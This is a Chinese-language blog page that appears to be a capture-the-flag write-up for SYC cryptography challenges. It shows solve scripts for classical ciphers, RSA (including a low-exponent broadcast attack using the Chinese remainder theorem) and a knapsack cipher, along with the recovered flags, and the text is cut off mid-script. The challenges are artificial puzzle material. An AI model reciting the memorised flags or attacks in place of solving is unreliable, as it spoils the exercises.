
<!DOCTYPE html>
<html lang="zh-CN ">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>windgodm || </title>
    <meta name="author" content="yssf">
    <meta name="description" content=" ">
    <meta name="keywords" content=" ">
    <link rel="icon" href="/blog//blog/imgs/child.jpg">
    <link rel="stylesheet" href="/blog/css/antd.min.css">
    
    <link rel="stylesheet" href="/blog/css/maiden-theme.css">
    
    <script src="/blog/js/vue.js"></script>
    <script src="/blog/js/antd.min.js"></script>
<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/blog/rss2.xml" title="windgodm" type="application/rss+xml">
</head>

<body>

    <div id="loading"
        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
        <div
            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
            <div id="loadcontent"
                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
                <div>
                    <h2>LOADING...</h2>
                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
                    <div>
                        <img src="/blog/dancingkitty.gif" alt="loading">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="layout">
        <transition name="into">
            <div v-show="show_page" style="display: none;">
                <div id="menu_show">
                     
<nav id="menu">
    <div class="desktop-menu">
        <a href="/blog/">
            <span class="title">windgodm</span>
        </a>
        
        <a href="/">
            <span>
                <a-icon type="home" theme="filled" />
            </span>
            <span>home</span>
        </a>
        
        <a href="/contact">
            <span>
                <a-icon type="idcard" theme="filled" />
            </span>
            <span>about</span>
        </a>
        
        <a href="/making">
            <span>
                <a-icon type="folder" theme="filled" />
            </span>
            <span>archives</span>
        </a>
        
        <a href="/making">
            <span>
                <a-icon type="book" theme="filled" />
            </span>
            <span>categories</span>
        </a>
        
        <a href="/making">
            <span>
                <a-icon type="tags" theme="filled" />
            </span>
            <span>tags</span>
        </a>
        
    </div>

    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div :class="'title'" @click="menu_show=!menu_show">
            <span style="margin-right: 10px;">
                <a-icon type="appstore" theme="filled" />
            </span>
            <span>windgodm</span>
        </div>
        <div class="items" v-show="menu_show">
            
            <a href="/">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="home" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
                </div>
            </a>
            
            <a href="/contact">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="idcard" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
                </div>
            </a>
            
            <a href="/making">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="folder" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
                </div>
            </a>
            
            <a href="/making">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="book" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
                </div>
            </a>
            
            <a href="/making">
                <div class="item">
                    <div style="min-width:20px; max-width:50px; width: 10%">
                        <a-icon type="tags" theme="filled" />
                    </div>
                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
                </div>
            </a>
            
        </div>
        <div class="curtain" v-show="menu_show"></div>
    </div>

</nav>
                </div>

                <div id="main">
                     
<link rel="stylesheet" href="/blog/css/post-body.css">
<div class="article">
    <div>
        <h1> </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2020/12/8
        </span>

        

        
    </div>

    <div class="content" v-pre>
        <h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="二战情报员刘壮"><a href="#二战情报员刘壮" class="headerlink" title="二战情报员刘壮"></a>二战情报员刘壮</h3><blockquote>
<p>知识点:<br>摩斯密码</p>
</blockquote>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>你能知道刘壮在说什么？<br>得到的flag包裹上SYC{}<br>.-../.—-/..-/–../…./..-/….-/-./–./..–.-/../..–.-/–../.—-/-.–/.—-</p>
<h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><p>刘壮早上起床打摩丝</p>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>很容易想到, 这是使用摩斯密码<br>找一个网站解密得到: L1UZHU4NG_I_Z1Y1<br>(这里不知道为什么要去掉下划线才是正确的)<br>flag就是: SYC{L1UZHU4NGIZ1Y1}</p>
<h3 id="铠甲与萨满"><a href="#铠甲与萨满" class="headerlink" title="铠甲与萨满"></a>铠甲与萨满</h3><blockquote>
<p>知识点:<br>凯撒加密</p>
</blockquote>
<h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>YEI{roafnagtmroafnagtm_hgtmhgtmhgtm}</p>
<h4 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h4><p>kaisa?</p>
<h4 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h4><p>前三个字母应该SYC, (S-Y)%26=20<br>使用凯撒加密网站，位移20即可得到flag<br>SYC{liuzhuangliuzhuang_bangbangbang}</p>
<h3 id="维多利亚"><a href="#维多利亚" class="headerlink" title="维多利亚"></a>维多利亚</h3><blockquote>
<p>知识点:<br>维多利亚加密</p>
</blockquote>
<h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>原文:<br>Oowfza errqbbirtqpl ks afiiklr cifgd ho unvhxnigkctm bugokz iaf chnxhvek tkvgnvf xeccmjkr<br>errqbbirtqpve aehwektana nte wfavinxe iequge kbopnuigkogbt ucrwomfu altczrtbpvf<br>oadjvt uuvi iyiokjbuos abzq vo usmnm ig TGP vhxsm vu nh umnts bo dviegfzr</p>
<h4 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h4><p>flag格式 SYC{xx_xx_xx},除SYC外其他字母小写</p>
<h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><p>使用下面两种方法之一，得到原文<br>原文最后是: SYC there is no tears in vigenere<br>根据提示，flag就是: SYC{there_is_no_tears_in_vigenere}</p>
<h4 id="解法1-使用网站自动解决"><a href="#解法1-使用网站自动解决" class="headerlink" title="解法1: 使用网站自动解决"></a>解法1: 使用网站自动解决</h4><p>网址: <a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a><br>具体不再阐述</p>
<h4 id="解法2-猜测加手解"><a href="#解法2-猜测加手解" class="headerlink" title="解法2: 猜测加手解"></a>解法2: 猜测加手解</h4><p>第三行有个TGP，大胆猜测对应SYC<br>TGP的起始位置为三的倍数，猜测密钥长度为三的倍数</p>
<p>第一二行有两个相似的单词: errqbbirtqpl, errqbbirtqpve<br>根据其起始位置猜测密钥长度为6</p>
<p>SYC-TGP = (25, 18, 13)，使用此密钥加密密文<br>得到那两个单词变成djeptohjgphy, djeptohjgphid</p>
<p>因为TGP的位置在密钥后三位，所以单词的第4到第6位应该是正确的<br>由xxxpto猜到是crypto, crypto-errqbb = (24, 0, 7, 25, 18, 13)<br>使用此密钥加密密文便可得到wp开头那段话</p>
<p>由此得出解密密钥是(24, 0, 7, 25, 18, 13) = yahzsn<br>加密密钥是catbin</p>
<h4 id="加密用python脚本"><a href="#加密用python脚本" class="headerlink" title="加密用python脚本"></a>加密用python脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">24</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">25</span>, <span class="number">18</span>, <span class="number">13</span>]</span><br><span class="line">lenkey = <span class="built_in">len</span>(key)</span><br><span class="line">m = <span class="string">&#x27;errqbb&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> m:</span><br><span class="line">    </span><br><span class="line">    x = <span class="built_in">ord</span>(x)</span><br><span class="line">    <span class="keyword">if</span> x != <span class="number">32</span>: <span class="comment"># &#x27; &#x27; = 32, 跳过空格</span></span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">91</span>: <span class="comment"># 大写</span></span><br><span class="line">            d = <span class="number">65</span> <span class="comment"># &#x27;A&#x27; = 65</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># 小写</span></span><br><span class="line">            d = <span class="number">97</span> <span class="comment"># &#x27;a&#x27; = 97</span></span><br><span class="line">        x -= d</span><br><span class="line">        x += key[i%lenkey]</span><br><span class="line">        x %= <span class="number">26</span></span><br><span class="line">        x += d</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    c += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<h3 id="成都养猪二厂"><a href="#成都养猪二厂" class="headerlink" title="成都养猪二厂"></a>成都养猪二厂</h3><blockquote>
<p>知识点:<br>猪圈密码, 栅栏密码(W栅栏)</p>
</blockquote>
<h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><p>v先生家里蛮大的，还有很多啤酒。v先生之所以能过上这样快哉的生活可能是因为他的养猪场厂围上了高高的栅栏</p>
<h4 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h4><p>flag格式 SYC{xx_xx_xx},除SYC外其他字母小写 单词间隔开添加下划线</p>
<h4 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h4><p>题目给了个图片, 根据图片以及提示可以猜出是猪圈密码(图片好像需要旋转一下)<br>根据猪圈码表得到ssyirceehsagiulisolbhy</p>
<p>接下来根据提示可能是栅栏，正常栅栏尝试不行<br>改用w栅栏, 栏数是7，得到sychishouseisreallybig<br>根据提示得到flag: SYC{his_house_is_really_big}</p>
<h3 id="规规矩矩的工作"><a href="#规规矩矩的工作" class="headerlink" title="规规矩矩的工作"></a>规规矩矩的工作</h3><blockquote>
<p>知识点:<br>矩阵乘法, 矩阵的逆<br>建议学习python numpy库的使用(用于矩阵运算)</p>
</blockquote>
<h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><p>题目描述：wlz当年玩蹦蹦蹦为了抽希尔氪了很多钱</p>
<h4 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h4><p>hint1:让我看看是谁不好好上线代课？<br>hint2:decode程序可能加载的有点慢并且请在命令行内运行</p>
<h4 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h4><p>题目文件给了以下两个东西和一个程序<br>key_encrypt<br>1 1 1<br>1 2 3<br>1 3 6<br>enc：<br>12<br>12<br>10</p>
<p>运行程序得知需要输入key，且为大写(程序输入后会闪退, 需要在powershel里运行)</p>
<p>根据提示可知这应该是两个矩阵，设第一个为A，第二个为B，key对应的矩阵为K<br>尝试 K = AB, 得到 K = (34 66 108)<sup>T</sup>，mod(26)+’A’ 得到 ‘IOE’，输入程序发现不对<br>尝试 B = AK, K = A<sup>-1</sup>B，得到K = (10, 4, -2)<sup>T</sup>，mod(26)+’A’ 得到 ‘KEY’<br>输入程序得到SYC{linear_algebra_make_ctf_great_again}</p>
<h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><blockquote>
<p>知识点:<br>RSA加密算法</p>
</blockquote>
<h4 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h4><p>题目给了个task.py，阅读代码发现给出了c, q, n, e; 要求m</p>
<ol>
<li>由q, n求出p</li>
<li>由p, q得到phi_</li>
<li>由e, phi_得到d</li>
<li>用d, n加密c得到m</li>
<li>把m转换成bytes再转换成string</li>
</ol>
<h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><p>脚本省略了bytes转换成string的一步吗，因为不影响print</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output = (<span class="number">177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194</span>, <span class="number">166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043</span>, <span class="number">191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### get c, q, n</span></span><br><span class="line">c = output[<span class="number">0</span>]</span><br><span class="line">q = output[<span class="number">1</span>]</span><br><span class="line">n = output[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### get p</span></span><br><span class="line">p = <span class="built_in">int</span>(n / q)</span><br><span class="line"></span><br><span class="line"><span class="comment">### get phi_</span></span><br><span class="line">phi_ = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### get d</span></span><br><span class="line">d = invert(e, phi_)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h3 id="simple-calculation"><a href="#simple-calculation" class="headerlink" title="simple calculation"></a>simple calculation</h3><blockquote>
<p>知识点：<br>矩阵运算</p>
</blockquote>
<p>题目是A，C已知<br>AX = B，B = C mod(26)</p>
<p>我是由C猜测B，如何逐个尝试，知道遇到有意思的解：TESNB</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">A = np.matrix([[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">              [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>],</span><br><span class="line">              [<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>],</span><br><span class="line">              [<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>],</span><br><span class="line">              [<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">k = np.matrix([<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]).transpose()</span><br><span class="line"></span><br><span class="line">B = np.matrix([[<span class="number">3</span>], [<span class="number">7</span>], [<span class="number">1</span>], [<span class="number">1</span>], [<span class="number">20</span>]])</span><br><span class="line">B += k*<span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### B = AX</span></span><br><span class="line">X = np.dot(A.I, B)</span><br><span class="line">print(X)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;SYC&#123;&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="number">65</span> + <span class="built_in">int</span>(X[i,<span class="number">0</span>])%<span class="number">26</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="childRSA"><a href="#childRSA" class="headerlink" title="childRSA"></a>childRSA</h3><blockquote>
<p>知识点：<br>RSA加密算法，中国剩余定理</p>
</blockquote>
<p>这题是低加密指数广播攻击，e为3，使用中国剩余定理即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">question = [</span><br><span class="line">&#123;<span class="string">&#x27;n&#x27;</span> : mpz(<span class="number">0xe096219878f492bcdb2a2d03995521e7a65125733bae18e7d0005e35343fea3653698de60231d29b2d1b44a0b4ffd3183855b9042275f769e1702fa8843062df0938821db0258af40ab3cda8e54eb6ac826d545df91dfe76266cb01b1d6fad39e6ef13ce730c1c2395136b0bbdf22c6b0daba63701d71c6ae70d4e06935b9941</span>),</span><br><span class="line"><span class="string">&#x27;c&#x27;</span> : mpz(<span class="number">0xff24bddc5a7b327535af92dba58c5d62a22d542e6ba1df6f91c98c7563d8e48e770fb623bfcc2f09ed49788293306ff709670b225da32ea134422d5e403b11c39ef6b144f96b2fe94b3aa136432ecea86a4069a4cb0b4d8570edb3fb5bb2cf0693184ef0c589887b012ebe6ea94e854a71a7eb768133d15e784e388976877db</span>)&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;n&#x27;</span> : mpz(<span class="number">0xa36b15a395edf3e99927f658e22d5f4aefd83434972c96cca5242a1aaa517ad83739451269723092dd9e73c00682dd3bbd74a985546def88196119b6d57b397283bc7b8b6029916df84284bec1725f6e5d3d29042af685c508a58ab6fb4e5bfeb326ae49330e3f4426abc1860ca4412feb976ee571075a47b854c9a6f5f0ebff</span>),</span><br><span class="line"><span class="string">&#x27;c&#x27;</span> : mpz(<span class="number">0x895f8283e2200bab1bf938ce3b5e42147b53a5178e436ea0b64a2380ba99776d5ba8046ef722858b20d9650ee68c09e905030f1634e0b32397b7b12236a5a301e5923a294ef1bdf16458f4fc8677370ce2ce3d0fd957da7466e5b104191d454455917147f3187b758c1c468db1b35514391e5b36bd1ac39e91bbb24fdbc07872</span>)&#125;,</span><br><span class="line">&#123;<span class="string">&#x27;n&#x27;</span> : mpz(<span class="number">0x9d4732db2539d1166dc6865670be11951bf49295bc8c472f34682a0fb7f2b3ba96dcfa1945c2e4685dfeae5255abe2ab3b7fb2282971bb16ce02d14082f71755e8a65c956e114336914a409a9f1158fb362a92c4e169fa3c460ea26fb5c6693447b14f1c3156a2d9308dd993d7ea708a00ad149fb77109d8a5f77de1703ba249</span>),</span><br><span class="line"><span class="string">&#x27;c&#x27;</span> : mpz(<span class="number">0x3bead3d6760bff4de22562978d4722bb21ee4792ebdb32703b6df9ff5176e033e97ad8fc81467f4b3df7bd4e8bcae09462f3eca93a3da1cd9d7e8de3e464471fdd0b70112c1c738b0daa2a37a65331eaa8954b81b410f62a0280da32eb3e305782d5f774d814ca0adb13344687387cf72657dc21724bcf69da810d7635b99467</span>)&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">N = mpz(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    N *= question[i][<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ms = [question[<span class="number">1</span>][<span class="string">&#x27;n&#x27;</span>]*question[<span class="number">2</span>][<span class="string">&#x27;n&#x27;</span>], question[<span class="number">0</span>][<span class="string">&#x27;n&#x27;</span>]*question[<span class="number">2</span>][<span class="string">&#x27;n&#x27;</span>], question[<span class="number">0</span>][<span class="string">&#x27;n&#x27;</span>]*question[<span class="number">1</span>][<span class="string">&#x27;n&#x27;</span>]]</span><br><span class="line"></span><br><span class="line">a = mpz(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    n = question[i][<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    m = mpz(N // n)</span><br><span class="line">    <span class="comment"># m = ms[i]</span></span><br><span class="line"></span><br><span class="line">    mi = invert(m, n)</span><br><span class="line">    a = (a + question[i][<span class="string">&#x27;c&#x27;</span>] * m * mi) % N</span><br><span class="line"></span><br><span class="line">m = iroot(a, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">print(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<h3 id="跳跃的指尖"><a href="#跳跃的指尖" class="headerlink" title="跳跃的指尖"></a>跳跃的指尖</h3><h4 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h4><p>wdr qsz awdx thu xdv eft thu ol rgy ilp(注意请将请将答案套上SYC{}提交)</p>
<h4 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h4><p>键盘上字母围着的就是flag</p>
<h3 id="Strange-code"><a href="#Strange-code" class="headerlink" title="Strange code"></a>Strange code</h3><blockquote>
<p>知识点：<br>01背包，Knapsack</p>
</blockquote>
<h4 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h4><p>I will mount a long wind some day and break the heavy waves And set my cloudy sail straight and bridge the deep, deep sea.</p>
<p>说实话，我看不懂简介</p>
<h4 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h4><p>1.Knapsack 2.flag格式为<code>SYC&#123;(secret_string)&#125;</code></p>
<h4 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h4><h4 id="生成公钥"><a href="#生成公钥" class="headerlink" title="生成公钥"></a>生成公钥</h4><p>a是私钥，b是公钥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [...] <span class="comment"># 超递增序列</span></span><br><span class="line"><span class="comment">### m &gt; sum(s)</span></span><br><span class="line">w = getPrime(n)</span><br><span class="line">b = [a[i]*w % m <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br></pre></td></tr></table></figure>

<h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>先将原文转换成int，再转换成二进制格式的字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mes = [<span class="built_in">int</span>(i, <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(bytes_to_long(<span class="built_in">bytes</span>(mes, encoding=<span class="string">&#x27;utf-8&#x27;</span>)))[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)]</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)</span><br><span class="line">	c += (b[i]*mes[i]) % m</span><br></pre></td></tr></table></figure>

<h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>推导过程见下面python代码片段</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">w_i = gp.invert(w, m)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">sum</span>(b[i]*mes[i] % m) = <span class="built_in">sum</span>(a[i]*w*mes[i] % m)</span><br><span class="line">c*w_i = <span class="built_in">sum</span>(w_i*a[i]*w*mes[i] % m) = <span class="built_in">sum</span>(a[i]*mes[i] % m)</span><br><span class="line"></span><br><span class="line"><span class="comment">### m &gt; sum(s)</span></span><br><span class="line">b[i]*w_i = s[i]*w*w_i % m = s[i] % m = s[i]</span><br></pre></td></tr></table></figure>

<h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">enc = <span class="number">4650243845163898051650</span></span><br><span class="line">bs = data[:]</span><br><span class="line">w = <span class="number">10609877878708146473</span></span><br><span class="line">m = <span class="number">253851571337947929263</span></span><br><span class="line"></span><br><span class="line">w_i = invert(w, m)</span><br><span class="line"></span><br><span class="line">a = [(w_i * b) % m <span class="keyword">for</span> b <span class="keyword">in</span> bs]</span><br><span class="line"></span><br><span class="line">av = enc*w_i % m</span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    i = <span class="number">63</span> - i_i</span><br><span class="line">    <span class="keyword">if</span> av &gt;= a[i]:</span><br><span class="line">        m += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        av -= a[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">print(av)</span><br><span class="line">m = m[::-<span class="number">1</span>]</span><br><span class="line">print(<span class="built_in">len</span>(m), m)</span><br><span class="line">m = <span class="built_in">int</span>(m, <span class="number">2</span>)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<h3 id="funny-rsa"><a href="#funny-rsa" class="headerlink" title="funny rsa"></a>funny rsa</h3><p>第一个脚本，解hint，包含验算部分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 